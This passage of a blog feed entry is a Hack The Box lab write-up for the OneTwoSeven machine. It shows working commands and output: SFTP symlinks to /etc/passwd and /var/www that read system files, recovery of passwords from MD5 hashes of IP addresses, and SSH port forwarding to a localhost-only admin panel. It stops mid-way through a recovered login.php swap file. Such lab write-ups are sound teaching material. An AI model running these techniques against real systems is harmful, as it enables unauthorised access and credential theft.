/></entry><entry><title type="html">Hack The Box - OneTwoSeven</title><link href="https://0xrick.github.io/hack-the-box/onetwoseven/" rel="alternate" type="text/html" title="Hack The Box - OneTwoSeven" /><published>2019-08-31T00:00:00+02:00</published><updated>2019-08-31T00:00:00+02:00</updated><id>https://0xrick.github.io/hack-the-box/onetwoseven</id><content type="html" xml:base="https://0xrick.github.io/hack-the-box/onetwoseven/">&lt;hr /&gt;
-
-&lt;h2 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h2&gt;
-&lt;p&gt;&lt;br /&gt; Hey guys today OneTwoSeven retired and here’s my write-up about it. It was a very special box and I enjoyed every part of it, especially the &lt;code class=&quot;highlighter-rouge&quot;&gt;apt&lt;/code&gt; man in the middle attack part. Definitely one of my favorite boxes. It’s a Linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.133&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;onetwoseven.htb&lt;/code&gt;. Let’s jump right in !
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/onetwoseven/0.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;nmap&quot;&gt;Nmap&lt;/h2&gt;
-&lt;p&gt;&lt;br /&gt; As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :
-&lt;br /&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC onetwoseven.htb&lt;/code&gt;
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/onetwoseven/1.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt; Only &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; on port 80 and &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt;.
-&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;web-enumeration&quot;&gt;Web Enumeration&lt;/h2&gt;
-&lt;p&gt;&lt;br /&gt; By going to &lt;code class=&quot;highlighter-rouge&quot;&gt;http://onetwoseven.htb&lt;/code&gt; we see this nice website :
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/onetwoseven/2.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt; There’s a sign-up button, and some other info :
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/onetwoseven/3.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/onetwoseven/4.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/onetwoseven/5.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/onetwoseven/6.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt; So now we know that &lt;code class=&quot;highlighter-rouge&quot;&gt;sftp&lt;/code&gt; is running, and we also know that if we tried to bruteforce anything we’ll get banned. 
-&lt;br /&gt; If we look at the navigation bar we can see 3 pages :
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/onetwoseven/7.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt; Home is where we are, statistics just shows stuff like up-time, banned ip addresses etc.., there’s a page titled Admin and it’s disabled, let’s look at the &lt;code class=&quot;highlighter-rouge&quot;&gt;html&lt;/code&gt; source :&lt;/p&gt;
-&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;        &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- Only enable link if access from trusted networks admin/20190212 --&amp;gt;&lt;/span&gt;
-        &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- Added localhost admin/20190214 --&amp;gt;&lt;/span&gt;
-		  &lt;span class=&quot;nt&quot;&gt;&amp;lt;li&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;nav-item&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;adminlink&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;nav-link disabled&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://onetwoseven.htb:60080/&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Admin&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;&lt;/span&gt;
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; Admin’s page is on port 60080 and it’s only accessible from &lt;code class=&quot;highlighter-rouge&quot;&gt;localhost&lt;/code&gt;, so we can skip that for now.
-&lt;br /&gt; I clicked on the sign-up button and got this page :
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/onetwoseven/8.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt; We have credentials for &lt;code class=&quot;highlighter-rouge&quot;&gt;sftp&lt;/code&gt; : &lt;code class=&quot;highlighter-rouge&quot;&gt;ots-5MWI1ZmI : f991b5fb&lt;/code&gt;
-&lt;br /&gt; and we also have a personal home page (http://onetwoseven.htb/~ots-5MWI1ZmI/) which looks like this :
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/onetwoseven/9.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Nothing here.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;style&amp;gt;body&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;margin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;padding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;background&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;sx&quot;&gt;url(&quot;/dist/img/abstract-architecture-attractive-988873.jpg&quot;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;no-repeat&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;center&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;center&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;fixed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;-webkit-background-size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cover&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;-moz-background-size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cover&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;-o-background-size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cover&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;background-size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cover&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/style&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;sftp-user-flag&quot;&gt;SFTP, User Flag&lt;/h2&gt;
-&lt;p&gt;&lt;br /&gt; With the &lt;code class=&quot;highlighter-rouge&quot;&gt;sftp&lt;/code&gt; credentials we have we can access the root directory of our home page :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/onetwoseven# sftp ots-5MWI1ZmI@onetwoseven.htb
-ots-5MWI1ZmI@onetwoseven.htb's password:
-Connected to ots-5MWI1ZmI@onetwoseven.htb.
-sftp&amp;gt; ls
-public_html
-sftp&amp;gt; ls -la
-drwxr-xr-x    3 0        0            4096 Aug 29 19:57 .
-drwxr-xr-x    3 0        0            4096 Aug 29 19:57 ..
-drwxr-xr-x    2 1010     1010         4096 Feb 15  2019 public_html
-sftp&amp;gt; pwd
-Remote working directory: /
-sftp&amp;gt; cd public_html
-sftp&amp;gt; ls -la
-drwxr-xr-x    2 1010     1010         4096 Feb 15  2019 .
-drwxr-xr-x    3 0        0            4096 Aug 29 19:57 ..
--rw-r--r--    1 1010     1010          349 Feb 15  2019 index.html
-sftp&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; You may wonder why we didn’t see an open port for &lt;code class=&quot;highlighter-rouge&quot;&gt;sftp&lt;/code&gt;, that’s because &lt;code class=&quot;highlighter-rouge&quot;&gt;sftp&lt;/code&gt; runs on top of &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; by default, check &lt;a href=&quot;https://www.jscape.com/blog/what-port-does-sftp-use&quot;&gt;this&lt;/a&gt;.
-&lt;br /&gt; I created a &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; test file and uploaded it :&lt;/p&gt;
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'test'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sftp&amp;gt; put test.php
-Uploading test.php to /public_html/test.php
-test.php                                                                                                                                                                         100%   22     0.1KB/s   00:00    
-sftp&amp;gt;  
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; Unfortunately it will respond with &lt;code class=&quot;highlighter-rouge&quot;&gt;403&lt;/code&gt; to any uploaded &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; file :
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/onetwoseven/10.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt; I checked the commands list of &lt;code class=&quot;highlighter-rouge&quot;&gt;sftp&lt;/code&gt; and saw that I can create symlinks with &lt;code class=&quot;highlighter-rouge&quot;&gt;symlink&lt;/code&gt; :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sftp&amp;gt; help
-Available commands:
-bye                                Quit sftp
-cd path                            Change remote directory to 'path'
-chgrp grp path                     Change group of file 'path' to 'grp'
-chmod mode path                    Change permissions of file 'path' to 'mode'
-chown own path                     Change owner of file 'path' to 'own'
-df [-hi] [path]                    Display statistics for current directory or
-                                   filesystem containing 'path'
-exit                               Quit sftp
-get [-afPpRr] remote [local]       Download file
-reget [-fPpRr] remote [local]      Resume download file
-reput [-fPpRr] [local] remote      Resume upload file
-help                               Display this help text
-lcd path                           Change local directory to 'path'
-lls [ls-options [path]]            Display local directory listing
-lmkdir path                        Create local directory
-ln [-s] oldpath newpath            Link remote file (-s for symlink)
-lpwd                               Print local working directory
-ls [-1afhlnrSt] [path]             Display remote directory listing
-lumask umask                       Set local umask to 'umask'
-mkdir path                         Create remote directory
-progress                           Toggle display of progress meter
-put [-afPpRr] local [remote]       Upload file
-pwd                                Display remote working directory
-quit                               Quit sftp
-rename oldpath newpath             Rename remote file
-rm path                            Delete remote file
-rmdir path                         Remove remote directory
-symlink oldpath newpath            Symlink remote file
-version                            Show SFTP version
-!command                           Execute 'command' in local shell
-!                                  Escape to local shell
-?                                  Synonym for help
-sftp&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; So I tried to create a symlink to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; and it worked :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sftp&amp;gt; symlink /etc/passwd passwd
-sftp&amp;gt; ls -la
-drwxr-xr-x    2 1010     1010         4096 Aug 29 20:14 .
-drwxr-xr-x    3 0        0            4096 Aug 29 19:57 ..
--rw-r--r--    1 1010     1010          349 Feb 15  2019 index.html
-lrwxrwxrwx    1 1010     1010           11 Aug 29 20:14 passwd
-sftp&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/onetwoseven/11.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt; As you can see there’s a user with &lt;code class=&quot;highlighter-rouge&quot;&gt;localhost&lt;/code&gt;’s ip, that can be helpful but we need to know his password, we already got the username : &lt;code class=&quot;highlighter-rouge&quot;&gt;ots-yODc2NGQ&lt;/code&gt;.
-&lt;br /&gt; I wanted to know how usernames were generated so I made some assumptions and tested them.
-&lt;br /&gt; Usernames were following the same pattern which was &lt;code class=&quot;highlighter-rouge&quot;&gt;ots-&lt;/code&gt; then a base-64 encoded string , I tried to decode the string from my username (&lt;code class=&quot;highlighter-rouge&quot;&gt;5MWI1ZmI&lt;/code&gt;) but I got nothing readable, so I tried to encode my password (&lt;code class=&quot;highlighter-rouge&quot;&gt;f991b5fb&lt;/code&gt;) :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/onetwoseven# echo f991b5fb | base64
-Zjk5MWI1ZmIK
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; So the string in usernames is part of the base-64 encoded password, but how these password are generated in the first place ? my password looked like &lt;code class=&quot;highlighter-rouge&quot;&gt;hex&lt;/code&gt; but after decoding it I got nothing readable so I guessed it might be a part of an &lt;code class=&quot;highlighter-rouge&quot;&gt;md5&lt;/code&gt; hash, but what hash ? I tried the &lt;code class=&quot;highlighter-rouge&quot;&gt;md5&lt;/code&gt; hash of my ip :&lt;/p&gt;
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;@kali&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;~/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HTB&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;boxes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;onetwoseven&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# python&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;Python&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;2.7&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Apr&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2019&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;57&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GCC&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;8.3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;linux2&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;Type&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;help&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;copyright&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;credits&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;license&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;more&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;information&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;hashlib&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;md5&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;md5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;10.10.xx.xx&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hexdigest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;f991b5fbxxxxxxxxxxxxxxxxxxxxxxxx&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; So passwords are just the first 8 chars of the ip’s md5 hash, now we can generate the password for &lt;code class=&quot;highlighter-rouge&quot;&gt;ots-yODc2NGQ&lt;/code&gt; based on the same idea :&lt;/p&gt;
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;md5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;127.0.0.1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hexdigest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;f528764d624db129b32c21fbca0cb8d6&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;ots-yODc2NGQ : f528764d&lt;/code&gt;  , let’s try it :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/onetwoseven# sftp ots-yODc2NGQ@onetwoseven.htb
-ots-yODc2NGQ@onetwoseven.htb's password:
-Connected to ots-yODc2NGQ@onetwoseven.htb.
-sftp&amp;gt; ls -la
-drwxr-xr-x    3 0        0            4096 Feb 15  2019 .
-drwxr-xr-x    3 0        0            4096 Feb 15  2019 ..
-drwxr-xr-x    2 999      999          4096 Feb 15  2019 public_html
--r--r-----    1 0        999            33 Feb 15  2019 user.txt
-sftp&amp;gt; get user.txt
-Fetching /user.txt to user.txt
-/user.txt                                                                                                                                                                        100%   33     0.2KB/s   00:00    
-sftp&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/onetwoseven/12.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt; We owned user.
-&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;admin-panel-arbitrary-file-upload-rce&quot;&gt;Admin panel, Arbitrary File Upload, RCE&lt;/h2&gt;
-&lt;p&gt;&lt;br /&gt; I tried &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; but I got this message :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/onetwoseven# ssh ots-yODc2NGQ@onetwoseven.htb
-ots-yODc2NGQ@onetwoseven.htb's password:
-This service allows sftp connections only.
-Connection to onetwoseven.htb closed.
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; However we can still use it to forward ports, let’s forward port &lt;code class=&quot;highlighter-rouge&quot;&gt;60080&lt;/code&gt; :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/onetwoseven# ssh -nNT -L 60080:127.0.0.1:60080 ots-yODc2NGQ@onetwoseven.htb
-ots-yODc2NGQ@onetwoseven.htb's password:
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/onetwoseven/13.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt; We need credentials to login, I used the &lt;code class=&quot;highlighter-rouge&quot;&gt;symlink&lt;/code&gt; command and created a symlink to &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www&lt;/code&gt; :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sftp&amp;gt; symlink /var/www www
-sftp&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/onetwoseven/14.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/onetwoseven/15.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt; I downloaded &lt;code class=&quot;highlighter-rouge&quot;&gt;login.php.swp&lt;/code&gt; : 
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/onetwoseven/16.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt; Because it’s a &lt;code class=&quot;highlighter-rouge&quot;&gt;vim&lt;/code&gt; swap file it had a lot of unreadable characters so I used strings :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/onetwoseven# strings login.php.swp &amp;gt; login.php
-root@kali:~/Desktop/HTB/boxes/onetwoseven#
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;login.php&lt;/code&gt; :&lt;/p&gt;
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;b0VIM 8.0
-u\k*
-root
-onetwoseven
-/var/www/html-admin/login.php
-utf-8
-3210
-#&quot;! 
-	    &lt;span class=&quot;nt&quot;&gt;&amp;lt;table&amp;gt;&lt;/span&gt;
-            &lt;span class=&quot;nt&quot;&gt;&amp;lt;h4&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class =&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;form-signin-heading&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;font&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;size=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;-1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;color=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;red&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/font&amp;gt;&amp;lt;/h4&amp;gt;&lt;/span&gt;
